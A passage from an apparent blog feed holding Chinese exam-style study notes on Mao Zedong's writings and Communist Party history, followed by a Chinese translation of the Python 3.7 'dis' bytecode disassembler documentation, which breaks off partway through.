id="《反对本本主义》-1930年">《反对本本主义》 1930年</h3><p>1.是党内第一篇反对教条主义的文献；</p><p>2.是党内第一篇提出思想路线的文章；</p><p>3.提出“没有调查，就没有发言权”；</p><p>4.认为“中国革命斗争的胜利要靠中国同志了解中国情况”。开始形成独立自主、自力更生的思想；</p><p>5.提出一切从实际出发的实事求是的思想路线；</p><p>6.基本形成了包含毛泽东思想活的灵魂的实事求是、群众路线、独立自主的基本思想。基本形成了明确的马克思主义的思想路线。</p><hr><h3 id="《论反对日本帝国主义的策略》-1935年">《论反对日本帝国主义的策略》 1935年</h3><p>1.指出“半殖民地的政治和经济的主要特点之一，就是民族资产阶级的软弱性”，这是“他们从娘肚子带出来的老毛病” ；</p><p>2.阐明了与民族资产阶级建立统一战线的可能性，分析了买办资产阶级发生分裂和比那化的可能性；</p><p>3.民族资产阶级的“两面性”即革命性和动摇性、妥协性是由软弱性决定的。</p><hr><h3 id="《共产党人发刊词》-1939年">《共产党人发刊词》 1939年</h3><p>1.提出党在革命中的三大法宝(统一战线、武装斗争、党的建设)；</p><p>2.第一次提出“马列主义理论和中国革命的实践相结合”；</p><p>3.把党的建设称为“伟大的工程”；</p><p>4.指出统一战线和武装斗争是中国共产党领导的中国资产阶级民主革命的两个基本特点；是中国革命的两个武器，党组织是掌握这两个武器的英勇战士；</p><p>5.分析了革命性质(资产阶级民主革命)、革命的对帝(帝、封)、革命动力(无、农、城、民)、革命的形式(武装斗争)。</p><hr><h3 id="《中国革命和中国共产党》-1939年">《中国革命和中国共产党》 1939年</h3><p>1.第一次提出新民主主义革命这一科学概念，即“无产阶级领导之下的人民大众的反帝反封建的革命” ；</p><p>2.强调认清中国国情的重要性“乃是认清一切革命问题的基本的依据”；</p><p>3.分析了社会性质，提出革命对象、革命动力；</p><p>4.指出中国革命如果没有无产阶级的领导，就必然不能胜利；</p><p>5.提出民主主义革命是社会主义革命的必要准备，社会主义革命是民主主义革命的必然趋势。</p><hr><h3 id="《论持久战》">《论持久战》</h3><p>1.分析了中日双方矛盾的四个基本特点：敌强我弱、敌小我大、敌退步我进步(关键)、敌寡助我多助；</p><p>2.批驳“速胜论”和“亡国论”；</p><p>3.预见了抗日战争的三个阶段：防御、相持、反攻；</p><p>4.阐明兵民是胜利之本的思想，即要依靠人民来争取抗日战争的最后胜利；</p><p>5.把抗日游击战争放在战略地位考察，依据国情，即“中国是一个处于进步时代的大而弱的国家” ；</p><p>6.阐明了战略防御理论，应承认积极防御，反对消极防御。</p><hr><h3 id="《湖南农民运动考察报告》">《湖南农民运动考察报告》</h3><p>1.总结辛亥革命失败原因：“国民革命需要一个大的农村变动。辛亥革命没有这个变动，所以失败了。”；</p><p>2.指出国民革命的中心问题是农民问题；</p><p>3.揭示了中国革命的对象；</p><p>4.分析了民族资产阶级的两面性。</p><hr><h3 id="《新民主主义论》-1940年">《新民主主义论》 1940年</h3><p>1.指出中国革命必须分两步走：民主革命、社会主义革命；</p><p>2.新民主主义革命是社会主义革命的必要准备；</p><p>3.论述了“新民主主义共和国”的国体、政体，并提出新民主主义的政治归纳纲领；</p><p>4.新民主主义的政治纲领是建立无产阶级领导的、以工农联盟为基础的各个革命阶级的联合专政的民主共和国；</p><p>5.第一次完整提出新民主主义的经济纲领。</p><hr><h3 id="《改造我们的学习》-1941年">《改造我们的学习》 1941年</h3><p>对“实事求是”作了新解释：“事实就是客观存在着的一切事物，‘是’就是客观事物的内部联系，即规律性，‘求’就是我们去研究”，认为这是对待马克思主义的正确态度。</p><hr><h3 id="《在延安文艺座谈会上的讲话》-1942年">《在延安文艺座谈会上的讲话》 1942年</h3><p>第一次提出“为什么人的问题，是一个根本的问题，原则的问题”中心问题，即“基本上是一个为群众的问题和一个如何为群众的问题”。</p><hr><h3 id="《关于领导方法的若干问题》-1943年">《关于领导方法的若干问题》 1943年</h3><p>第一次从哲学高度对党的群众路线作了理论概括，把党的群众路线与马克思主义认识论、辩证法和唯物论有机地统一起来。“从群众中来，到群众中去。”</p><hr><h3 id="《论联合政府》-1945年中共七大">《论联合政府》 1945年中共七大</h3><p>1.指出只有经过民主主义，才能达到社会主义，这是马克思主义的天经地义；</p><p>2.提出废除国民党一党专政，建立由各党各派组成“民主联合政府”的主张；</p><p>3.对人民战争的思想作了概括：在中国共产党的领导下，充分依靠广大人民群众，有一支以全心全意为人民服务为宗旨的军队作为骨干，有一整套的正确战略 战术，善于根据情况的变化，进行游击战和运动战，并以根据地为依托，实行“三结合”的武装力量体制，进行人民战争；</p><p>4.概括了我党的三大优良作风：理论联系实际，密切联系群众，批评与自我批判。</p><hr><h3 id="《目前形式和我们的任务》-1947年">《目前形式和我们的任务》 1947年</h3><p>1.第一次提出新民主主义的三大经济纲领：</p><p>① 没收封建阶级的土地归农民所有；</p><p>② 没收蒋介石、宋子文、孔祥熙、陈立夫为首的垄断资本归新民主主义国家所有；</p><p>③ 保护民主工商业。</p><p>2.提出土改的两个原则：</p><p>① 必须满足贫农雇农的要求；</p><p>② 必须坚决地团结中农，不要损害中农的利益。</p><p>3.人民军队的十大军事原则</p><hr><h3 id="《在晋绥干部会议上的讲话》-1948年">《在晋绥干部会议上的讲话》 1948年</h3><p>1.提出新民主主义革命的总路线：“无产阶级领导的人民大众的，反对帝国主义，封建主义和官僚资本主义的革命”；</p><p>2.提出土地改革的总路线：“依靠贫农雇农，团结中农，有步骤有分别地消灭封建剥削制度，发展工业生产”；</p><p>3.第一次把官僚资本主义列为革命对象。</p><hr><h3 id="《论人民民主专政》-1949年">《论人民民主专政》 1949年</h3><p>1.总结中国民主革命胜利基本经验，“总结我们的经验，集中到一点，就是工人阶级(经过共产党)领导的以工农联盟为基础的人民民主专政”；</p><p>2.完整提出了人民民主专政的理论，进一步完善了新民主主义的政治纲领；</p><p>3.科学阐明新中国国家政权的性质及各阶级在国家中的地位与相互关系；</p><p>4.指出“我们现在的方针是节制资本主义，而不是消灭资本主义”；</p><p>5.提出新中国在政治上必须实行一边倒，即倒向社会主义一边；</p><hr><h3 id="《中国革命战争的战略问题》">《中国革命战争的战略问题》</h3><p>分析了中国革命战争的四个特点：</p><p>1.中国是一个正好子经济发展不平衡的半殖民地的大国，而且经过了1924-1927年的革命；</p><p>2.敌人的强大；</p><p>3.人民军队的弱小；</p><p>4.共产党的领导和土地革命；</p><p>5.规定了中国人民军队的可能发展和可能战胜其敌人；</p><p>6.规定了中国人民军队的不可能很快发展和不可能很快战胜其敌人，这就决定了战争的持久性。</p><hr><h3 id="《战争和战略问题》">《战争和战略问题》</h3><p>提出“革命的中心任务和最高形式是武装夺取政权，是战争解决问题”。</p><hr><h3 id="《关于纠正党内的错误思想》">《关于纠正党内的错误思想》</h3><p>指出：要通过思想政治工作“教育党员用马克思列宁主义的方法去作政治形式的分析和阶级势力的估量，从代替主观主义的分析和估量”，“使党员注意社会经济的调查和研究，由此来决定斗争的策略和工作的方法。”</p><hr><h3 id="《中国共产党在民族战争中的地位》">《中国共产党在民族战争中的地位》</h3><p>指出：“共产党员应是实事求是的模范”“只有实事求是，才能完成确定的任务”，“科学的态度是实事求是”。</p><hr><h3 id="《关于调查人口和土地状况的通知》">《关于调查人口和土地状况的通知》</h3><p>提出“不做正确的调查同样没有发言权”。</p><p><strong>《将革命进行到底》 1948年</strong></p><p>第一次公开使用人民民主专政概念。</p><p>中共中央政治局报告中首次提出建立无产阶级领导的以工农联盟为基础的人民民主专政。</p><hr><h3 id="《在中国共产党第七届中央委员会第二次全体会议上的报告》-1948年">《在中国共产党第七届中央委员会第二次全体会议上的报告》 1948年</h3><p>一九四九年三月五日</p><p>1.制定了迅速夺取全国胜利的各项政策，确立了革命胜利后建设人民民主专政新国家的蓝图，为新民主主义社会向社会主义社会的转变指明了道路，在政治、 思想、理论上做了准备；</p><p>2.说明在全国胜利局面下，党的工作中心必须由乡村转到城市，必须把恢复和发展生产作为党的中心任务；</p><p>3.分析了当时中国的五种经济成分的发展状况和党必须采取的正确政策；</p><p>4.估计了中国人民民主革命胜利后国内外的阶级斗争的新形势，提醒全党警惕“糖衣炮弹”，保持谦虚、谨慎、不骄不躁的作风，保持艰苦奋斗的作风。</p><hr><h3 id="《中国农村的社会主义高潮》-1955年">《中国农村的社会主义高潮》 1955年</h3><p>在按语中指出“政治工作是一切经济工作的生命线。在社会经济制度发生根本变革的时期，尤其是这样。”</p><hr><h3 id="《论十大关系》-1956年">《论十大关系》 1956年</h3><p>1.明确了建设社会主义必须根据中国情况走自己道路的根本思想，标志着探索中国自己的社会主义道路的开始；</p><p>2.阐述了正确解决我国社会主义建设过程中存在的某些矛盾的基本原则，强调要处理好这些矛盾的各个方面以调动各种积极因素；</p><p>3.阐述了重工业、农业的关系；</p><p>4.论述了中央和地方的关系；</p><p>5.第一次阐述了中国共产党和各民主党派“长期共存、互相监督”的方针；</p><p>6.将经济建设与国防建设的关系作为一个大问题提出。</p><hr><h3 id="《关于正确处理人民内部矛盾的问题》-1957年">《关于正确处理人民内部矛盾的问题》 1957年</h3><p>1.第一次系统地阐述了社会主义的矛盾问题，提出了正确区分和处理两类不同性质矛盾的学说；</p><p>2.分析了社会主要矛盾和党的中心任务是社会主义社会的基本矛盾；</p><p>3.论及了民主与专政，民主与集中的关系；</p><p>4.辨证地论证了重工业、轻工业和农业的关系；</p><p>5.指出“长期共存、互相监督”的方针是我国具体的历史条件的产物；</p><p>6.详尽论述了“百花齐放、百家争鸣”的方针(不是首次提出)；</p><p>7.阐述了知识分子问题。</p><hr><h3 id="《关于建国以来党的若干历史问题的决议》邓小平主持">《关于建国以来党的若干历史问题的决议》邓小平主持</h3><p>1.指出社会主义经济建设必须从我国的国情出发，量力而行，积极奋斗，有步骤分阶段地实现现代化的目标；</p><p>2.对以毛泽东为代表的中国共产党人在领导中国革命和建设过程中形成的具有自己特色的立场、观点和方法进行了比较完整、系统的论述，并把它们提高  到“灵魂”、“精髓”的高度，凸现了它们的本质意义；</p><p>3.实事求是，就是从实际出发，理论联系实际，就是要把马克思列宁主义普遍原理同中国革命具体实践相结合；</p><p>4.实事求是地评价了毛泽东的历史地位及毛泽东思想，并运用历史唯物主义和辩证唯物主义的方法分析毛泽东晚年的错误。</p><h2 id="中国共产党取得胜利的三大法宝">中国共产党取得胜利的三大法宝</h2><p>党的建设、武装斗争、统一战线</p><blockquote><p>“党的建设”的威力：锻铸党和人民的血肉联系</p><p>“武装斗争”的威力：解决中国革命的道路问题和主要斗争形式问题</p><p>“统一战线”的威力：团结全民族最大多数人共同奋斗</p></blockquote><h2 id="中国共产党早期的组织活动">中国共产党早期的组织活动</h2><ol><li>加强对马克思主义的宣传和研究</li><li>在工人中进行宣传和组织工作</li><li>建立社会主义共青团</li><li>进行有关建党问题的研究与讨论</li></ol><h2 id="抗日民族统一战线策略">抗日民族统一战线策略</h2><p>中共在处理与包括国民党在内的其他阶级和党派的关系问题上，强调党的独立自主原则，制定了发展进步势力、争取中间势力、孤立顽固势力的策略方针，形成了“又联合又斗争，以斗争求团结”的统一战线策略思想。</p><h2 id="中共召开的几次大会（一大和七大）">中共召开的几次大会（一大和七大）</h2><h3 id="中共一大">中共一大</h3><p>大会确定了<code>党的名称和党的纲领</code>，选举产生了党的领导机构中央局，陈独秀为书记。一大的召开宣告中国共产党正式成立。</p><hr><h3 id="中共七大">中共七大</h3><p><code>将毛泽东思想确立为党的指导思想并写入党章。</code>七大新党章指出：“毛泽东思想，就是马克思列宁主义的理论与中国革命的实践之统一的思想，就是中国的共产主义，中国的马克思主义。”</p><p>其总结了中国新民主主义革命20多年曲折发展的历史经验，制定了正确的路线、纲领和策略，克服了党内的错误思想，使全党特别是党的高级干部对于中国民主革命的发展规律有了比较明确的认识，从而使全党在马克思列宁主义、毛泽东思想的基础上达到了空前的团结。它为党领导人民去争取抗日战争的胜利和新民主主义革命在全国的胜利，奠定了政治上、思想上、组织上的基础。</p><h2 id="中国人民抗战胜利的原因是什么">中国人民抗战胜利的原因是什么</h2><ol><li><p>中国共产党在全民族抗战中起到了中流砥柱的作用。</p></li><li><p>中国人民巨大的民族觉醒、空前的民族团结和英勇的民族抗争，是中国人民抗日战争胜利的决定性因素。</p></li><li><p>中国人民抗日战争的胜利，同世界所有爱好和平和正义的国家和人民、国际组织以及各种反法西斯力量的同情和支持也是分不开的。</p></li></ol><h2 id="抗日战争胜利的意义是什么">抗日战争胜利的意义是什么</h2><ol><li><p>彻底粉碎了日本军国主义殖民奴役中国的图谋，有力的捍卫了国家主权和领土完整，彻底洗刷了近代以来抗击外来侵略屡战屡败的民族耻辱</p></li><li><p>抗日战争的胜利，促进了中华民族的大团结，形成了伟大的抗战精神</p><blockquote><p>抗战精神内涵主要包括：天下兴亡、匹夫有责的爱国情怀；视死如归、宁死不屈的民族气节；不畏强暴、血战到底的英雄气概；百折不挠、坚忍不拔的必胜信念。</p></blockquote></li><li><p>中国人民抗日战争的胜利，对世界各国夺取反法西斯的胜利，维护世界和平产生了巨大影响。中国的国际地位得到提高，中华民族赢得了崇高的民族声誉</p></li><li><p>坚定了中国人民追求民族独立、自由、解放的意志，开启了古老中国凤凰涅槃、浴火重生的历史新进程，为中国共产党带领全国人民继续奋斗，赢得新民主主义革命胜利，奠定了重要基础</p></li></ol><h2 id="人民解放军转入战略进攻的标志是什么">人民解放军转入战略进攻的标志是什么</h2><p>挺进大别山</p><h2 id="从“五四指示”到《中国土地法大纲》">从“五四指示”到《中国土地法大纲》</h2><h3 id="《五四指示》">《五四指示》</h3><p>是1946年5月4日中共中央发布的《关于土地问题的指示》，简称《五四指示》，该指示决定将减租减息的政策改为没收地主土地分配给农民。《五四指示》揭开了解放区土地立法的序幕，为实现耕者有其田的土地革命指明了方向。</p><ol><li>要坚决地支持和引导广大农民群众，采取适当方法，使地主阶级剥削农民而占有的土地转移到农民手中</li><li>用一切方法吸收中农参加运动，绝不可侵犯中农土地</li><li>一般不变动富农的土地，对富农和地主有所区别</li><li>不可将农村中反对封建地主阶级的方法，运用于城市中反对工商资产阶级的斗争</li></ol><hr><h3 id="《中国土地法大纲》-1947年">《中国土地法大纲》(1947年)</h3><ol><li><p>“废除封建性及半封建性剥削的土地制度，实行耕者有其田的土地制度”</p></li><li><p>“乡村中一切地主的土地及公地，由乡村农会接收”，分配给无地或者少地的农民</p></li></ol><h2 id="第二条战线的形成与发展">第二条战线的形成与发展</h2><p>在国民党统治区，以学生运动为先到的人民民主运动迅速发展开来，配合成为人民解放战争的第二条战线</p><blockquote><p>第一条战线：中国共产党与蒋介石反动政府</p></blockquote><h2 id="人民政协会议与《共同纲领》">人民政协会议与《共同纲领》</h2><p>1949年9月21日，中国人民政治协商会议第一届全体会议在北平中南海怀仁堂隆重开幕，会议通过的<code>《中国人民政治协商会议组织法》《中华人民共和国中央人民政府组织法》《中国人民政治协商会议共同纲领》</code>被认为是新中国奠基的3个历史性文件。</p><p>《共同纲领》(毛泽东的《论人民民主专政》构成其基础)成为中国人民的大宪章，它在一个时期内起着<code>临时宪法</code>的作用。</p><p>人民政协的召开，标志着中国的新型政党制度 —— 中国共产党领导的<code>多党合作和政治协商制度</code>的确立。在会上通过了以<code>北平为中华人民共和国首都</code>，决定采用<code>公元纪年</code>，以<code>《义勇军进行曲》为代国歌</code>，国旗为<code>五星红旗</code>，象征全国人民在共产党的领导下的大团结。</p><h2 id="共产党领导的中国革命胜利的基本经验-三大法宝的考察">共产党领导的中国革命胜利的基本经验(三大法宝的考察)</h2><p>坚持将马克思列宁主义的基本原理和中国的具体实际结合起来，必须不断推进马克思主义中国化的事业</p><ol><li><p>建立广泛的统一战线</p><blockquote><p>统一战线中存在两个联盟：主要依靠劳动者的联盟，即工人、农民和城市小资产阶级的联盟；建立和扩大劳动者与非劳动者的联盟，主要是劳动者与民族资产阶级的联盟</p></blockquote></li><li><p>坚持革命的武装斗争</p><blockquote><p>中国的武装斗争实质上是工人阶级领导的农民战争</p></blockquote></li><li><p>加强共产党自身的建设</p></li></ol><h2 id="人民民主专政在新中国创建的意义">人民民主专政在新中国创建的意义</h2><ol><li><p>首先人民民主专政制度的诞生，代表了中国前进的方向，也由此确立了人民在其中的主导位置。</p></li><li><p>是中国革命发展的必然结果</p></li><li><p>是思想理论的产物。民主专政是马克思主义与无产阶级人员结合相关中国当时国情发展出来的。所以人民民主专政是思想理论的产物，是由无产阶级发展演化而成的。</p></li></ol><h2 id="新中国成立初期面临的考验有哪些">新中国成立初期面临的考验有哪些</h2><ol><li><p>解放中国的任务还没有完结束，在广大的新解放区还没有进行封建土地制度的改革;</p></li><li><p>中国的经济十分落后;</p></li><li><p>以美国为首的西方资本主义阵营，企图实行强硬的对华政策，即以政治上孤立、经济上封锁、军事上威胁的政策，从根本上搞垮新中国;</p></li><li><p>中国共产党能不能经受住执政的考验，须继续保持谦虚、谨慎、不骄、不躁的作风和艰苦奋斗的作风。</p></li></ol><h2 id="从新民主主义到社会主义的过渡">从新民主主义到社会主义的过渡</h2><ol><li><p>没收官僚资本，确立社会主义国营经济的领导地位。官僚资本是中国资本主义经济的主体。</p><blockquote><p>没收官僚资本具有两重性质：从反对外国帝国主义的附庸 —— 中国的买办资产阶级 —— 的意义上看，她具有民主革命的性质；从反对中国的大资产阶级的意义上看，它又具有社会主义革命的性质</p></blockquote></li><li><p>开始将资本主义纳入国家资本主义轨道 。</p></li><li><p>引导个体农民在土地改革后逐步走上互助合作的道路。</p></li></ol><hr><p>新民主主义时期上的经济特点 —— 既有社会主义，又有资本主义</p><h2 id="社会主义三大改造">社会主义三大改造</h2><p>我国对<code>农业</code>、<code>手工业</code>和<code>资本主义工商业</code>生产资料私有制的社会主义改造，在理论上和实践上丰富和发展了马克思列宁主义的科学社会主义理论，极大地促进了工、农、商业的社会变革和整个国民经济的发展。</p><p>实现了把生产资料私有制转变为社会主义公有制的任务。政治上社会主义的基本制度在我国初步建立;经济上社会主义计划经济在我国基本确立;为我国的社会主义工业化开辟了道路;从此进入社会主义初级阶段</p><h2 id="十一届三中全会的内容及召开的意义">十一届三中全会的内容及召开的意义</h2><h3 id="意义-3">意义</h3><p>党的十一届三中全会标志着：中国从此进入了改革开放和社会主义现代化建设的历史新时期，中国共产党从此开始了建设中国特色社会主义的新探索。</p><hr><h3 id="内容">内容</h3><p>这次会议彻底否定了“两个凡是”的方针，重新确立解放思想、实事求是的思想路线；停止使用“以阶级斗争为纲”的口号，作出把党和国家的工作重心转移到经济建设上来，实行改革开放的伟大决策；会议实际上形成了以邓小平为核心的党中央领导集体。</p><blockquote><p>两个凡是源于1977年2月7日的两报一刊社论《学好文件抓住纲》，表述为：“凡是毛主席作出的决策，我们都坚决拥护，凡是毛主席的指示，我们都始终不渝地遵循。”</p></blockquote><h2 id="五位一体">五位一体</h2><p>经济建设、政治建设、文化建设、社会建设、生态文明建设</p><h2 id="四个全面">四个全面</h2><p>2014年12月，习近平总书记在江苏调研时第一次明确提出“四个全面”。2020年6月，中国共产党十九届五中全会对“四个全面”战略布局进行了调整，由“全面建成小康社会、全面深化改革、全面依法治国、全面从严治党”发展为“全面建设社会主义现代化国家、全面深化改革、全面依法治国、全面从严治党”。</p><p>全面建设社会主义现代化国家是战略目标，全面深化改革、全面依法治国、全面从严治党是战略举措。</p><h2 id="当代中国精神的集中体现">当代中国精神的集中体现</h2><p>党的十九大报告指出，社会主义核心价值观是当代中国精神的集中体现，同时以爱国主义为核心的民族精神和以改革创新为核心的时代精神，构成了中国精神的基本内容</p><blockquote><p>党的十八大提出，倡导富强、民主、文明、和谐，倡导自由、平等、公正、法治，倡导爱国、敬业、诚信、友善，积极培育和践行社会主义核心价值观。</p><p>富强、民主、文明、和谐是国家层面的价值目标</p><p>自由、平等、公正、法治是社会层面的价值取向</p><p>爱国、敬业、诚信、友善是公民个人层面的价值准则</p></blockquote><h2 id="为什么说“没有共产党就没有新中国”">为什么说“没有共产党就没有新中国”</h2><p>中国共产党一经诞生，就把为中国人民谋幸福、为中华民族谋复兴确立为自己的初心使命。中国共产党将自己的命运与国家、民族和亿万人民的命运紧密相连。为了实现中华民族伟大复兴，中国共产党团结带领中国人民创造了新民主主义革命、社会主义革命和建设、改革开放和社会主义现代化建设、新时代中国特色社会主义的伟大成就。经过艰辛探索，中华民族迎来了从站起来、富起来到强起来的伟大飞跃，实现中华民族伟大复兴进入了不可逆转的历史进程。</p>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dis--- Python 字节码反汇编器</title>
    <link href="/2022/05/22/dis---%20Python%20%E5%AD%97%E8%8A%82%E7%A0%81%E5%8F%8D%E6%B1%87%E7%BC%96%E5%99%A8/"/>
    <url>/2022/05/22/dis---%20Python%20%E5%AD%97%E8%8A%82%E7%A0%81%E5%8F%8D%E6%B1%87%E7%BC%96%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>Source code:</strong> <a href="https://github.com/python/cpython/tree/3.7/Lib/dis.py">Lib/dis.py</a></p><hr><p><a href="https://docs.python.org/zh-cn/3.7/library/dis.html#module-dis"><code>dis</code></a> 模块通过反汇编支持CPython的 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-bytecode">bytecode</a> 分析。该模块作为输入的 CPython 字节码在文件 <code>Include/opcode.h</code> 中定义，并由编译器和解释器使用。</p><p><strong>CPython implementation detail:</strong> 字节码是 CPython 解释器的实现细节。不保证不会在Python版本之间添加、删除或更改字节码。不应考虑将此模块的跨 Python VM 或 Python 版本的使用。</p><p><em>在 3.6 版更改:</em> 每条指令使用2个字节。以前字节数因指令而异。</p><p>示例：给出函数 <code>myfunc()</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params">alist</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(alist)<br></code></pre></td></tr></table></figure><p>可以使用以下命令显示 <code>myfunc()</code> 的反汇编</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">&gt;&gt;&gt; dis.dis(myfunc)<br> <span class="hljs-number"> 2 </span>         <span class="hljs-number"> 0 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(len)<br>             <span class="hljs-number"> 2 </span>LOAD_FAST               <span class="hljs-number"> 0 </span>(alist)<br>             <span class="hljs-number"> 4 </span>CALL_FUNCTION            1<br>             <span class="hljs-number"> 6 </span>RETURN_VALUE<br></code></pre></td></tr></table></figure><p>(“2” 是行号)。</p><h2 id="字节码分析">字节码分析</h2><p><em>3.4 新版功能.</em></p><p>字节码分析 API 允许将 Python 代码片段包装在 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Bytecode"><code>Bytecode</code></a> 对象中，以便轻松访问已编译代码的详细信息。</p><ul><li><p><em>class</em> <code>dis.``Bytecode</code>(<em>x</em>, ***, <em>first_line=None</em>, <em>current_offset=None</em>)</p><p>分析的字节码对应于函数、生成器、异步生成器、协程、方法、源代码字符串或代码对象（由 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#compile"><code>compile()</code></a> 返回）。这是下面列出的许多函数的便利包装，最值得注意的是 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.get_instructions"><code>get_instructions()</code></a> ，迭代于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Bytecode"><code>Bytecode</code></a> 的实例产生字节码操作 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Instruction"><code>Instruction</code></a> 的实例。如果 <em>first_line</em> 不是 <code>None</code> ，则表示应该为反汇编代码中的第一个源代码行报告的行号。否则，源行信息（如果有的话）直接来自反汇编的代码对象。如果 <em>current_offset</em> 不是 <code>None</code> ，则它指的是反汇编代码中的指令偏移量。设置它意味着 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Bytecode.dis"><code>dis()</code></a> 将针对指定的操作码显示“当前指令”标记。<em>classmethod</em> <code>from_traceback</code>(<em>tb</em>)从给定回溯构造一个 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Bytecode"><code>Bytecode</code></a> 实例，设置 <em>current_offset</em> 为异常负责的指令。<code>codeobj</code>已编译的代码对象。<code>first_line</code>代码对象的第一个源代码行（如果可用）<code>dis</code>()返回字节码操作的格式化视图（与 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.dis"><code>dis.dis()</code></a> 打印相同，但作为多行字符串返回）。<code>info</code>()返回带有关于代码对象的详细信息的格式化多行字符串，如 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.code_info"><code>code_info()</code></a> 。<em>在 3.7 版更改:</em> 现在可以处理协程和异步生成器对象。</p></li></ul><p>示例:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">bytecode = dis.Bytecode(myfunc)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> instr <span class="hljs-keyword">in</span> bytecode:</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-built_in">print</span>(instr.opname)</span><br><span class="hljs-meta">...</span><br>LOAD_GLOBAL<br>LOAD_FAST<br>CALL_FUNCTION<br>RETURN_VALUE<br></code></pre></td></tr></table></figure><h2 id="分析函数">分析函数</h2><p><a href="https://docs.python.org/zh-cn/3.7/library/dis.html#module-dis"><code>dis</code></a> 模块还定义了以下分析函数，它们将输入直接转换为所需的输出。如果只执行单个操作，它们可能很有用，因此中间分析对象没用：</p><ul><li><p><code>dis.code_info</code>(<em>x</em>)</p><p>返回格式化的多行字符串，其包含详细代码对象信息的用于被提供的函数、生成器、异步生成器、协程、方法、源代码字符串或代码对象。请注意，代码信息字符串的确切内容是高度依赖于实现的，它们可能会在Python VM或Python版本中任意更改。*3.2 新版功能.*<em>在 3.7 版更改:</em> 现在可以处理协程和异步生成器对象。</p></li><li><p><code>dis.show_code</code>(<em>x</em>, *, <em>file=None</em>)</p><p>将提供的函数、方法。源代码字符串或代码对象的详细代码对象信息打印到 <em>file</em> （如果未指定 <em>file</em> ，则为 <code>sys.stdout</code> ）。这是 <code>print(code_info(x), file= file)</code> 的便捷简写，用于在解释器提示符下进行交互式探索。*3.2 新版功能.*<em>在 3.4 版更改:</em> 添加 <em>file</em> 参数。</p></li><li><p><code>dis.``dis</code>(<em>x=None</em>, *, <em>file=None</em>, <em>depth=None</em>)</p><p>反汇编 <em>x</em> 对象。 <em>x</em> 可以表示模块、类、方法、函数、生成器、异步生成器、协程、代码对象、源代码字符串或原始字节码的字节序列。对于模块，它会反汇编所有功能。对于一个类，它反汇编所有方法（包括类和静态方法）。对于代码对象或原始字节码序列，它每字节码指令打印一行。它还递归地反汇编嵌套代码对象（推导式代码，生成器表达式和嵌套函数，以及用于构建嵌套类的代码）。在被反汇编之前，首先使用 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#compile"><code>compile()</code></a> 内置函数将字符串编译为代码对象。如果未提供任何对象，则此函数会反汇编最后一次回溯。如果提供的话，反汇编将作为文本写入提供的 <em>file</em> 参数，否则写入 <code>sys.stdout</code> 。递归的最大深度受 <em>depth</em> 限制，除非它是 <code>None</code> 。 <code>depth=0</code> 表示没有递归。<em>在 3.4 版更改:</em> 添加 <em>file</em> 参数。<em>在 3.7 版更改:</em> 实现了递归反汇编并添加了 <em>depth</em> 参数。<em>在 3.7 版更改:</em> 现在可以处理协程和异步生成器对象。</p></li><li><p><code>dis.distb</code>(<em>tb=None</em>, *, <em>file=None</em>)</p><p>如果没有传递，则使用最后一个回溯来反汇编回溯的堆栈顶部函数。 指示了导致异常的指令。如果提供的话，反汇编将作为文本写入提供的 <em>file</em> 参数，否则写入 <code>sys.stdout</code> 。<em>在 3.4 版更改:</em> 添加 <em>file</em> 参数。</p></li><li><p><code>dis.disassemble</code>(<em>code</em>, <em>lasti=-1</em>, *, <em>file=None</em>)</p></li><li><p><code>dis.disco</code>(<em>code</em>, <em>lasti=-1</em>, *, <em>file=None</em>)</p><p>反汇编代码对象，如果提供了 <em>lasti</em> ，则指示最后一条指令。输出分为以下几列：行号，用于每行的第一条指令当前指令，表示为 <code>--&gt;</code> ，一个标记的指令，用 <code>&gt;&gt;</code> 表示，指令的地址，操作码名称，操作参数，和括号中的参数解释。参数解释识别本地和全局变量名称、常量值、分支目标和比较运算符。如果提供的话，反汇编将作为文本写入提供的 <em>file</em> 参数，否则写入 <code>sys.stdout</code> 。<em>在 3.4 版更改:</em> 添加 <em>file</em> 参数。</p></li><li><p><code>dis.get_instructions</code>(<em>x</em>, *, <em>first_line=None</em>)</p><p>在所提供的函数、方法、源代码字符串或代码对象中的指令上返回一个迭代器。迭代器生成一系列 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#dis.Instruction"><code>Instruction</code></a> ，命名为元组，提供所提供代码中每个操作的详细信息。如果 <em>first_line</em> 不是 <code>None</code> ，则表示应该为反汇编代码中的第一个源代码行报告的行号。否则，源行信息（如果有的话）直接来自反汇编的代码对象。<em>3.4 新版功能.</em></p></li><li><p><code>dis.findlinestarts</code>(<em>code</em>)</p><p>此生成器函数使用代码对象 <em>code</em> 的 <code>co_firstlineno</code> 和 <code>co_lnotab</code> 属性来查找源代码中行开头的偏移量。它们生成为 <code>(offset, lineno)</code> 